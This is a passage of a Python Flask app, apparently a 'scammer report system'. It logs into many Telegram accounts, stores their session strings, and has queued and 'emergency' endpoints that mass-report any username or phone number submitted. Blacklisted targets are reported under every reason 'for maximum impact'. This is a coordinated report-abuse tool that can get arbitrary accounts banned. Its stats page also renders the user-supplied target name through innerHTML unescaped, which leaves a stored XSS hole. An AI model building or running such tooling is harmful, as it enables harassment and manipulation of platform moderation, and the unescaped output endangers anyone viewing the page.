        .nav-link.active { background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%); color: white; }
        .btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 10px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
        }
        .btn:hover { transform: translateY(-2px); }
    </style>
</head>
<body>
    <div class="container">
        <div class="nav-bar">
            <a href="/login" class="nav-link">📱 Accounts</a>
            <a href="/report" class="nav-link">🚨 Report</a>
            <a href="/stats" class="nav-link active">📊 Stats</a>
        </div>
        <h1>📊 Report Statistics</h1>
        
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-icon">📨</div>
                <div class="stat-value" id="totalReports">0</div>
                <div class="stat-label">Total Reports</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon">📅</div>
                <div class="stat-value" id="todayReports">0</div>
                <div class="stat-label">Today</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon">🎯</div>
                <div class="stat-value" id="scammersReported">0</div>
                <div class="stat-label">Scammers</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon">📱</div>
                <div class="stat-value" id="activeAccounts">0</div>
                <div class="stat-label">Active Accounts</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon">🚫</div>
                <div class="stat-value" id="blacklistCount">0</div>
                <div class="stat-label">Blacklisted</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon">📥</div>
                <div class="stat-value" id="queueSize">0</div>
                <div class="stat-label">Queue</div>
            </div>
        </div>
        
        <h3>Recent Reports</h3>
        <div id="reportList"><p style="color:#666;">Loading...</p></div>
        <button class="btn" onclick="loadStats()">🔄 Refresh</button>
    </div>
    
    <script>
        function loadStats() {
            fetch('/api/report-stats')
                .then(r => r.json())
                .then(data => {
                    const s = data.stats;
                    document.getElementById('totalReports').textContent = s.total_reports || 0;
                    document.getElementById('todayReports').textContent = s.today_reports || 0;
                    document.getElementById('scammersReported').textContent = s.scammers_reported || 0;
                    document.getElementById('activeAccounts').textContent = (s.active_accounts || 0) + '/' + (s.accounts || 0);
                    document.getElementById('blacklistCount').textContent = s.blacklist_count || 0;
                    document.getElementById('queueSize').textContent = s.queue_size || 0;
                    
                    let html = '';
                    (data.recent_reports || []).forEach(r => {
                        html += `<div class="report-item">
                            <div class="report-header">
                                <span class="report-scammer">🎯 ${r.scammer}</span>
                                <span class="report-time">${new Date(r.timestamp).toLocaleString()}</span>
                            </div>
                            <div style="color:#666;">
                                ${r.successful_accounts}/${r.accounts_used} accounts | ${r.total_reports_sent || 0} reports
                            </div>
                        </div>`;
                    });
                    document.getElementById('reportList').innerHTML = html || '<p>No reports yet</p>';
                });
        }
        
        loadStats();
        setInterval(loadStats, 30000);
    </script>
</body>
</html>
'''

# ============================================
# FLASK ROUTES
# ============================================
@app.route('/')
def index():
    return redirect('/login')

@app.route('/login')
def login_page():
    return render_template_string(LOGIN_PAGE)

@app.route('/report')
def report_page():
    return render_template_string(REPORT_PAGE)

@app.route('/stats')
def stats_page():
    return render_template_string(STATS_PAGE)

@app.route('/ping')
def ping():
    active = sum(1 for a in accounts if a.get('active', False))
    return jsonify({
        'status': 'ok',
        'accounts': len(accounts),
        'active_accounts': active,
        'total_reports': report_stats.get('total_reports', 0),
        'queue_size': report_queue.qsize()
    })

@app.route('/api/accounts')
def get_accounts():
    acc_list = [{
        'id': a['id'],
        'name': a.get('name', 'Unknown'),
        'phone': (a.get('phone', '') or '****')[:4] + '****',
        'active': a.get('active', True)
    } for a in accounts]
    return jsonify({
        'success': True,
        'accounts': acc_list,
        'count': len(acc_list),
        'active_count': sum(1 for a in acc_list if a.get('active'))
    })

@app.route('/api/report-reasons')
def get_report_reasons():
    reasons = [{'key': k, 'name': v['name'], 'icon': v['icon']} for k, v in REPORT_REASONS.items()]
    return jsonify({'success': True, 'reasons': reasons})

@app.route('/api/report', methods=['POST'])
def submit_report():
    try:
        data = request.json or {}
        scammer = data.get('scammer', '').strip()
        reasons = data.get('reasons', [])
        message = data.get('message', '').strip()
        immediate = data.get('immediate', False)
        
        if not scammer:
            return jsonify({'success': False, 'error': 'Enter a username or phone number'})
        if not reasons:
            return jsonify({'success': False, 'error': 'Select at least one reason'})
        
        valid_reasons = [r for r in reasons if r in REPORT_REASONS]
        if not valid_reasons:
            return jsonify({'success': False, 'error': 'Invalid reasons'})
        
        # Check if blacklisted - use all reasons for maximum impact
        with blacklist_lock:
            if scammer.lower() in blacklist:
                valid_reasons = list(REPORT_REASONS.keys())
                logger.info(f"⚠️ Blacklisted scammer - using all reasons")
        
        # Process immediately
        if immediate or report_queue.qsize() >= MAX_QUEUE_SIZE:
            logger.info(f"⚡ Processing report immediately for: {scammer}")
            result = mass_report(scammer, valid_reasons, message)
        else:
            # Queue it
            report_queue.put({'scammer': scammer, 'reasons': valid_reasons, 'message': message})
            result = {
                'success': True,
                'queued': True,
                'scammer': scammer,
                'message': 'Report queued for processing',
                'queue_position': report_queue.qsize()
            }
            logger.info(f"📥 Queued report for: {scammer}")
        
        # Add to blacklist
        with blacklist_lock:
            blacklist.add(scammer.lower())
        save_json('blacklist.json', list(blacklist))
        
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Report error: {e}\n{traceback.format_exc()}")
        return jsonify({'success': False, 'error': 'Server error. Try again.'}), 500

@app.route('/api/immediate-report', methods=['POST'])
def immediate_report():
    try:
        data = request.json or {}
        scammer = data.get('scammer', '').strip()
        if not scammer:
            return jsonify({'success': False, 'error': 'Scammer required'})
        
        all_reasons = list(REPORT_REASONS.keys())
        result = mass_report(scammer, all_reasons, "EMERGENCY REPORT: Known scammer")
        return jsonify(result)
    except Exception as e:
        logger.error(f"Emergency report error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/report-stats')
def report_stats_handler():
    recent = reports[-20:] if reports else []
    return jsonify({
        'success': True,
        'stats': {
            'total_reports': report_stats.get('total_reports', 0),
            'today_reports': report_stats.get('today_reports', 0),
            'successful_reports': report_stats.get('successful_reports', 0),
            'failed_reports': report_stats.get('failed_reports', 0),
            'scammers_reported': report_stats.get('scammers_reported', 0),
            'accounts': len(accounts),
            'active_accounts': sum(1 for a in accounts if a.get('active', False)),
            'blacklist_count': len(blacklist),
            'queue_size': report_queue.qsize()
        },
        'recent_reports': recent[::-1]
    })

@app.route('/api/add-account', methods=['POST'])
def add_account():
    try:
        phone = request.json.get('phone', '').strip()
        if not phone:
            return jsonify({'success': False, 'error': 'Phone required'})
        if not phone.startswith('+'):
            phone = '+' + phone
        
        async def send_code():
            client = await TelegramHelper.create_client(StringSession().save())
            try:
                result = await client.send_code_request(phone)
                sid = str(int(time.time() * 1000))
                temp_sessions[sid] = {
                    'phone': phone,
                    'hash': result.phone_code_hash,
                    'session': client.session.save(),
                    'created_at': time.time()
                }
                masked = phone[:4] + '****' + phone[-3:] if len(phone) > 7 else phone
                return {'success': True, 'session_id': sid, 'phone_masked': masked}
            finally:
                await client.disconnect()
        
        result = TelegramHelper.run_async(send_code(), timeout=30)
        return jsonify(result)
    except errors.FloodWaitError as e:
        return jsonify({'success': False, 'error': f'Wait {e.seconds}s'})
    except Exception as e:
        logger.error(f"Add account error: {e}")
        return jsonify({'success': False, 'error': str(e)[:100]}), 500

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    try:
        data = request.json
        code = data.get('code', '').strip()
        sid = data.get('session_id', '')
        pwd = data.get('password', '')
        
        if not sid or sid not in temp_sessions:
            return jsonify({'success': False, 'error': 'Session expired'})
        
        td = temp_sessions[sid]
        
        async def verify():
            client = await TelegramHelper.create_client(td['session'])
            try:
                await client.sign_in(td['phone'], code, phone_code_hash=td['hash'])
                me = await client.get_me()
                
                new_acc = {
                    'id': int(time.time() * 1000),
                    'phone': me.phone or td['phone'],
                    'name': f"{me.first_name or ''} {me.last_name or ''}".strip() or f'User{str(int(time.time()))[-4:]}',
                    'username': me.username or '',
                    'session': client.session.save(),
                    'active': True,
                    'telegram_id': str(me.id),
                    'added_at': datetime.now().isoformat()
                }
                
                existing = next((a for a in accounts if str(a.get('telegram_id')) == str(me.id)), None)
                if existing:
                    existing.update(new_acc)
                else:
                    accounts.append(new_acc)
                
                save_json('accounts.json', accounts)
                return {'success': True, 'account': {'id': new_acc['id'], 'name': new_acc['name']}}
            except errors.SessionPasswordNeededError:
                if not pwd:
                    return {'need_password': True}
                await client.sign_in(password=pwd)
                me = await client.get_me()
                # Same as above
                new_acc = {
                    'id': int(time.time() * 1000),
                    'phone': me.phone or td['phone'],
                    'name': f"{me.first_name or ''} {me.last_name or ''}".strip() or f'User{str(int(time.time()))[-4:]}',
                    'username': me.username or '',
                    'session': client.session.save(),
                    'active': True,
                    'telegram_id': str(me.id),
                    'added_at': datetime.now().isoformat()
                }
                existing = next((a for a in accounts if str(a.get('telegram_id')) == str(me.id)), None)
                if existing:
                    existing.update(new_acc)
                else:
                    accounts.append(new_acc)
                save_json('accounts.json', accounts)
                return {'success': True, 'account': {'id': new_acc['id'], 'name': new_acc['name']}}
            finally:
                await client.disconnect()
        
        result = TelegramHelper.run_async(verify(), timeout=60)
        
        if result.get('success') and sid in temp_sessions:
            del temp_sessions[sid]
        
        return jsonify(result)
    except Exception as e:
        logger.error(f"Verify error: {e}")
        return jsonify({'success': False, 'error': str(e)[:100]}), 500

@app.route('/api/remove-account', methods=['POST'])
def remove_account():
    try:
        aid = request.json.get('accountId')
        global accounts
        accounts = [a for a in accounts if a['id'] != aid and str(a['id']) != str(aid)]
        save_json('accounts.json', accounts)
        return jsonify({'success': True, 'message': 'Account removed'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/refresh-sessions', methods=['POST'])
def refresh_sessions():
    try:
        for acc in accounts:
            try:
                result = TelegramHelper.run_async(
                    TelegramHelper.create_client(acc['session']),
                    timeout=20
                )
                if result:
                    acc['active'] = True
            except:
                acc['active'] = False
        save_json('accounts.json', accounts)
        return jsonify({
            'success': True,
            'message': 'Sessions refreshed',
            'active_accounts': sum(1 for a in accounts if a.get('active'))
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

# ============================================
# QUEUE PROCESSOR
# ============================================
def queue_processor():
    while True:
        try:
            try:
                report_data = report_queue.get(timeout=5)
            except:
                continue
            
            logger.info(f"📤 Processing queued: {report_data.get('scammer')}")
            result = mass_report(
                report_data.get('scammer'),
                report_data.get('reasons', ['spam', 'scam']),
                report_data.get('message', '')
            )
            logger.info(f"✅ Queued done: {result.get('successful_accounts', 0)} accounts")
            report_queue.task_done()
            
        except Exception as e:
            logger.error(f"Queue error: {e}")
            time.sleep(5)

# ============================================
# KEEP ALIVE
# ============================================
def keep_alive():
    while True:
        time.sleep(180)
        try:
            requests.get(f"{SERVER_URL}/ping", timeout=10)
        except:
            pass

# ============================================
# INITIALIZATION
# ============================================
def initialize():
    os.makedirs('logs', exist_ok=True)
    load_data()
    
    logger.info("="*50)
    logger.info(f"🚀 SCAMMER REPORT SYSTEM")
    logger.info(f"📱 Accounts: {len(accounts)}")
    logger.info(f"📊 Total Reports: {report_stats.get('total_reports', 0)}")
    logger.info(f"🔌 Port: {PORT}")
    logger.info("="*50)
    
    threading.Thread(target=keep_alive, daemon=True).start()
    threading.Thread(target=queue_processor, daemon=True).start()

initialize()

if __name__ == '__main__':
    try:
        from waitress import serve
        serve(app, host='0.0.0.0', port=PORT, threads=6)
    except ImportError:
        app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
